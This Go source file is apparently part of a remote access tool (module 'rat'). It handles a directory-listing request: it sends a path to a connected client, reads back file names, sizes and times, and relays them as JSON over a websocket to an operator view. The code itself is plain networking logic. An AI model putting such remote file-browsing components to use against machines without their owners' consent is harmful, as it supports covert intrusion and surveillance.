package main

import (
	"encoding/json"
	"fmt"
	"rat/common"

	humanize "github.com/dustin/go-humanize"

	"golang.org/x/net/websocket"
)

type DirectoryPacket struct {
	Path string
}

func (packet DirectoryPacket) GetHeader() common.PacketHeader {
	return common.DirectoryHeader
}

func (packet DirectoryPacket) Write(c *Client) error {
	return c.WriteString(packet.Path)
}

type File struct {
	Dir  bool   `json:"directory"`
	Path string `json:"path"`
	Size string `json:"size"`
	Time string `json:"time"`
}

func (packet DirectoryPacket) Read(c *Client) error {
	len, _ := c.ReadInt()

	dirs := make([]File, 0)
	files := make([]File, 0)

	for i := 0; i < len; i++ {
		isDir, _ := c.ReadBool()
		path, err := c.ReadString()
		mod, err := c.ReadString()

		var size int64
		if !isDir {
			size, _ = c.ReadInt64()
		}

		if err != nil {
			fmt.Println("directory:", err.Error())
		}

		file := File{isDir, path, humanize.Bytes(uint64(size)), mod}

		if isDir {
			dirs = append(dirs, file)
		} else {
			files = append(files, file)
		}
	}

	if ws, ok := c.Listeners[common.DirectoryHeader]; ok {
		json, err := json.Marshal(append(dirs, files...))

		if err != nil {
			fmt.Println(err)
		}

		event := newEvent(DirectoryQueryEvent, c.Id, string(json))

		err = websocket.JSON.Send(ws, &event)

		if err != nil {
			return err
		}
	}

	delete(c.Listeners, common.DirectoryHeader)

	return nil
}
